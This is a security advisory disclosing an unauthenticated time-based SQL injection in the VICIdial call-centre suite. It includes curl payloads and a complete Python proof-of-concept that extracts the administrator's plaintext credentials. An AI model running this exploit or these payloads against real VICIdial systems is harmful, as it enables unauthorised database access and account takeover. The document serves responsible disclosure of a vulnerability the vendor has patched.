-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2024-011: VICIdial Unauthenticated SQL Injection
Title: VICIdial Unauthenticated SQL Injection
Advisory ID: KL-001-2024-011
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt
1. Vulnerability Details
Affected Vendor: VICIdial
Affected Product: VICIdial
Affected Version: 2.14-917a
Platform: GNU/Linux
CWE Classification: CWE-89: Improper Neutralization of Special
Elements used in an SQL Command
('SQL Injection')
CVE ID: CVE-2024-8503
2. Vulnerability Description
An unauthenticated attacker can leverage a time-based SQL
injection vulnerability in VICIdial to enumerate database
records. By default, VICIdial stores plaintext credentials
within the database.
3. Technical Description
VICIdial is an open-source contact center suite, mainly used
by call centers. The "vicidial.com" website boasts over 14,000
registered installations. There is a public SVN repository to
access the source code, as well as an ISO that can be used to
install the software. The ISO was used in a virtual machine
for testing purposes.
When performing SQL queries, VICIdial does not use prepared
statements, but instead uses the "preg\_replace" PHP function
to remove problematic characters in user-controlled input
before interpolating the variable into a SQL query. This
is largely an effective solution, as regular expressions
like "/[^-\_0-9a-zA-Z]/" are passed to "preg\_replace", which
essentially limits input to the characters shown in the pattern
(letters, numbers, underscores, and hyphens).
However, these scripts do not utilize a shared PHP file
for performing sanitization uniformly. Instead, each script
individually implements the "preg\_replace" function, leading
to inconsistencies in which patterns are used and where they
are applied.
For example, providing credentials via the "Authorization"
request header using the "Basic" scheme, most PHP scripts
sanitize the username value with the following line:
$PHP\_AUTH\_USER = preg\_replace('/[^-\_0-9a-zA-Z]/','',$PHP\_AUTH\_USER);
However, the "VERM\_AJAX\_functions.php" PHP script does not
perform any sanitization before inserting the username into
a SQL "INSERT" statement:
$PHP\_AUTH\_USER=$\_SERVER['PHP\_AUTH\_USER'];
$PHP\_AUTH\_PW=$\_SERVER['PHP\_AUTH\_PW'];
...
if ($function=="log\_custom\_report")
{
$rpt\_log\_stmt="insert ignore into
verm\_custom\_report\_holder(user,
report\_name, report\_parameters)
values('$PHP\_AUTH\_USER', '$custom\_report\_name',
'$LOGhttp\_referer') ON DUPLICATE KEY
UPDATE report\_name='$custom\_report\_name',
report\_parameters='$custom\_report\_vars'";
$rpt\_log\_rslt=mysql\_to\_mysqli($rpt\_log\_stmt, $link);
return mysqli\_affected\_rows($rpt\_log\_rslt);
}
Since "VERM\_AJAX\_functions.php" can be accessed without
authentication, this creates a straight forward unauthenticated
SQL injection vulnerability. While the page response cannot
be manipulated by the execution of the query, delays in the
page response can be observed when using SQL functions such as
"sleep()", enabling the enumeration of database values using
time-based SQL injection:
$ time curl -u "foo:bar" \
http://REDACTED/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m0.019s <--- (normal response time)
user 0m0.004s
sys 0m0.008s
$ time curl -u "','',sleep(5));#:bar" \
http://REDACTED/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m5.023s <--- (5-second delay in response time)
user 0m0.003s
sys 0m0.008s
This observable difference can be used to craft queries that
sleep under specific conditions, allowing an attacker to ask
"Yes or No" questions. In the following example, the "sleep()"
function is called only if the provided string matches the
database version:
$ time curl -u \
"','',IF(@@version='korelogic',sleep(5),NULL));#:bar" \
http://vicidial.zz/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m0.024s <--- (normal response time)
user 0m0.006s
sys 0m0.003s
$ time curl -u \
"','',IF(@@version='10.6.14-MariaDB-log',sleep(5),NULL));#:bar" \
http://vicidial.zz/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m5.019s <--- (5-second delay in response time)
user 0m0.004s
sys 0m0.008s
4. Mitigation and Remediation Recommendation
This issue has been remediated in the public svn/trunk codebase,
as of revision 3848 committed 2024-07-08.
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic,
Inc.
6. Disclosure Timeline
2024-07-05 : KoreLogic requests security contact from
support@vicidial.com.
2024-07-08 : KoreLogic reports vulnerability details to VICIdial
contact.
2024-07-08 : VICIdial notifies KoreLogic that the issue has been
remediated with revision 3848 in the public
Subversion repository.
2024-07-11 : KoreLogic confirms this vulnerability has been
remediated. KoreLogic asks VICIdial if it is
appropriate to publicly disclose the vulnerability
details at this time.
2024-07-11 : VICIdial requests four weeks of embargo in order to
upgrade supported customers.
2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
publicly disclose the vulnerability details at
this time.
2024-08-09 : VICIdial requests an additional two weeks of
embargo.
2024-09-10 : KoreLogic public disclosure.
7. Proof of Concept
The following script can be used to automate the exploitation process and
enumerate the results of provided queries:
$ time python unauth\_sqli.py -rh vicidial.zz -rp 443 -q 'SELECT @@version'
[+] Target appears vulnerable to time-based SQL injection
[~] Executing SQL: SELECT @@version
[~] 1
[~] 10
[~] 10.
[~] 10.6
[~] 10.6.
[~] 10.6.1
[~] 10.6.14
[~] 10.6.14-
[~] 10.6.14-M
[~] 10.6.14-Ma
[~] 10.6.14-Mar
[~] 10.6.14-Mari
[~] 10.6.14-Maria
[~] 10.6.14-MariaD
[~] 10.6.14-MariaDB
[~] 10.6.14-MariaDB-
[~] 10.6.14-MariaDB-l
[~] 10.6.14-MariaDB-lo
[~] 10.6.14-MariaDB-log
real 0m6.727s
user 0m0.425s
sys 0m0.020s
##############################
## unauth\_sqli.py ##
##############################
import string
import random
import urllib3
import argparse
import requests
from base64 import b64encode
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
class Exploit:
def \_\_init\_\_(self, rhost, rport, proxy=None):
"""
This 'sleep' duration is derived by the average response time
multiplied by this value. A server with an average response time
of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
"""
self.SLEEP\_MULTIPLIER = 30
self.REQUEST\_HEADERS = {'User-Agent': 'KoreLogic'}
self.ALLOWED\_SCHEMES = ['http', 'https']
if proxy:
self.REQUEST\_PROXIES = {
'http': proxy,
'https': proxy
}
else:
self.REQUEST\_PROXIES = {}
self.TARGET\_IP = rhost
self.TARGET\_PORT = rport
self.VICIDIAL\_FINGERPRINT = 'Please Hold while I redirect you!'
self.RANDOM\_CHARSET = string.ascii\_uppercase + string.digits
# returns a URI with 'http' or 'https'
def determine\_target\_uri(self):
for scheme in self.ALLOWED\_SCHEMES:
target\_uri = f'{scheme}://{self.TARGET\_IP}:{self.TARGET\_PORT}'
try:
response = requests.get(target\_uri, headers=self.REQUEST\_HEADERS, verify=False)
if self.VICIDIAL\_FINGERPRINT in response.text:
return target\_uri
except:
pass
# returns a session object with custom proxies/headers if supplied
def build\_requests\_session(self):
self.base\_uri = self.determine\_target\_uri()
session = requests.Session()
session.proxies = self.REQUEST\_PROXIES
session.verify = False
return session
# returns a random string of a given length
def random(self, length):
return ''.join(random.choice(self.RANDOM\_CHARSET) for \_ in range(length))
# returns a timedelta representing the response time of an injected SQL query
def time\_sql\_query(self, query, session):
username = f"goolicker', '', ({query}));# "
credentials = f'{username}:password'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/VERM/VERM\_AJAX\_functions.php'
request\_params = {'function': 'log\_custom\_report', self.random(5): self.random(5)}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
return response.elapsed
# returns a boolean if time-based SQL injection is possible, additionally
# sets the best 'sleep' duration based on response times
def is\_vulnerable(self, session, baseline\_iterations=5):
# determine average baseline response time
zero\_sleep\_query = f'SELECT (NULL)'
total\_baseline\_time = 0
for \_ in range(baseline\_iterations):
execution\_time = self.time\_sql\_query(zero\_sleep\_query, session)
total\_baseline\_time += execution\_time.total\_seconds()
average\_baseline\_response\_time = total\_baseline\_time / baseline\_iterations
self.sql\_baseline\_time = average\_baseline\_response\_time
# determine if injected sleep query impacts response time
sleep\_length = round(average\_baseline\_response\_time \* self.SLEEP\_MULTIPLIER, 2)
sleep\_query = f'SELECT (sleep({sleep\_length}))'
execution\_time = self.time\_sql\_query(sleep\_query, session)
if execution\_time.total\_seconds() >= sleep\_length:
self.sql\_sleep\_length = sleep\_length
return True
else:
return False
# determine if a character at a specific indice of a query result returns a
# boolean 'true' when compared to a given character using the supplied operator
def check\_indice\_of\_query\_result(self, session, query, indice, operator, ordinal):
parent\_query = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, sleep({self.sql\_sleep\_length}), null)'
execution\_time = self.time\_sql\_query(parent\_query, session)
return execution\_time.total\_seconds() >= (self.sql\_baseline\_time \* self.SLEEP\_MULTIPLIER)
def enumerate\_sql\_query(self, session, query='SELECT @@version', charset=string.printable):
# convert charset to ordinals
all\_characters = sorted([ord(char) for char in charset])
reduced\_characters = all\_characters
# use a binary search and enumerate query results
result = ''
indice = 1
indice\_could\_be\_null = True
while True:
"""
we check if the value is NULL once per indice
to determine when a string ends. this adds one
request per indice, but since every boolean 'true'
results in a delay this is faster than counting
the length of the string before enumrating.
"""
if indice\_could\_be\_null:
if self.check\_indice\_of\_query\_result(session, query, indice, '=', '0'):
break
else:
indice\_could\_be\_null = False
# enumerate each character of query result with a binary search
middle\_indice = len(reduced\_characters) // 2
middle\_ordinal = reduced\_characters[middle\_indice]
if self.check\_indice\_of\_query\_result(session, query, indice, '<=', middle\_ordinal):
if self.check\_indice\_of\_query\_result(session, query, indice, '=', middle\_ordinal):
reduced\_characters = all\_characters
result += chr(middle\_ordinal)
indice += 1
indice\_could\_be\_null = True
print(f'[~] {result}')
else:
reduced\_characters = reduced\_characters[:middle\_indice]
else:
reduced\_characters = reduced\_characters[middle\_indice:]
return result
# returns administrator username and password by
# exploiting time-based SQL injection.
def extract\_admin\_credentials(self, session):
print('[~] Enumerating administrator credentials')
username\_charset = string.ascii\_letters + string.digits
admin\_username\_query = "SELECT user FROM vicidial\_users WHERE user\_level = 9 AND modify\_same\_user\_level = '1' LIMIT 1"
admin\_username = self.enumerate\_sql\_query(session, admin\_username\_query, username\_charset)
print(f'[+] Username: {admin\_username}')
password\_charset = string.ascii\_letters + string.digits + '-.+/=\_'
admin\_password\_query = f"SELECT pass FROM vicidial\_users WHERE user = '{admin\_username}' LIMIT 1"
admin\_password = self.enumerate\_sql\_query(session, admin\_password\_query, password\_charset)
print(f'[+] Password: {admin\_password}')
return admin\_username, admin\_password
# injects SQL queries and enumerates results if instance is vulnerable
def exploit(self, custom\_query=None):
session = self.build\_requests\_session()
is\_vulnerable = self.is\_vulnerable(session)
if is\_vulnerable:
print('[+] Target appears vulnerable to time-based SQL injection')
else:
print('[-] Failed to perform time-based SQL injection')
return
if custom\_query:
print(f'[~] Executing SQL: {custom\_query}')
self.enumerate\_sql\_query(session, custom\_query)
else:
self.extract\_admin\_credentials(session)
if \_\_name\_\_ == '\_\_main\_\_':
argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi')
required = argparser.add\_argument\_group('Required Arguments')
optional = argparser.add\_argument\_group('Optional Arguments')
required.add\_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
required.add\_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
optional.add\_argument('-q', '--query', required=False, help='Custom SQL query to execute', default=None)
optional.add\_argument('-p', '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', default=None)
arguments = argparser.parse\_args()
exploit = Exploit(
rhost = arguments.rhost,
rport = arguments.rport,
proxy = arguments.proxy
)
exploit.exploit(custom\_query=arguments.query)
The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCAA4FiEEB12WYZwbVwYTJ/b2DKLsCTlWkekFAmbgm1gaHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQDKLsCTlWkenMFQ/+JMm3fGfXFFfDd3oamH8W
FG1VNc2T8+Ea0OCu+iFALgmu90ghhxVM/cqaMtOm25NMqvT1pi9VQaIaA5+Ft+c+
7dnhYmRqpJWSPVU5Xxvq5Pt8wrNAp6u1I1c/i6y30OgB2Y3rFaJgxjbbTh8JYgWB
uWVtuUrHaWOAU+KHiy9ZbZ4WsnCGUyi71FdO6QC2Acw3qr4Hz+sg0GxIoNi9jqHo
tUWQfAbOKiSPUt0CyipIRQrJFBUL0wF3bATprCuORf/3j07dL9LaBl7gy0mQau4k
9SR/RsCxB0wHMdZALhK3RjJqk1gI0wNgVmlRjuumD5d6S4Gk0lXpCgzj4vdciHAH
V9qGue67sHSspVxQQV08zHrTlh95RF+0HnSlKlSHDfcP7t3BelYVHdHsRkioGQ6N
UBJZuGtwP6/89TLTCULncl4+H0mRXSmMLWM55O2/pSUNHUO85bI7OmXWflJdjItZ
2gCc++u0zYlubFuEhB5qfP6tnEAfOOfVGY0wlnN5nAHlKzqrcdcmK1Uuzk6Ztu5T
SWPMAsroU+GtuZhAcYGpVZTw/lNA3SBRCrJ8RHfWJNjIaZA9OMR2L2iLiDF8KuI3
QN6m2YV/ZCSTGXPmEjt9Lho/mtWUb6SR6guLHR0viATscYU/pe+WX+kCUaAKavVp
gVpFTMBa64wxLnJev31Japs=
=zl7U
-----END PGP SIGNATURE-----
